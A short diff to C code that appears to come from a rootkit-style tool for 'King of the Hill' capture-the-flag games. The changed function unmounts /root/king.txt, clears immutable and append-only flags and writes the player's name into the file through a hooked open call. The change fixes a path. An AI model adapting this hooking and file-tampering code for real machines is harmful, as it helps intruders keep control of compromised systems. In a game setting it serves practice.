@@ -215,7 +215,7 @@ int king() {
     umount2("/root/king.txt", MNT_DETACH);
     //remove immutable and append-only flags
     set_attributes("/root", UNLOCK_FILE);
-    set_attributes("/root/king", UNLOCK_FILE);
+    set_attributes("/root/king.txt", UNLOCK_FILE);
     //write nick to king.txt
     int kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
     write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
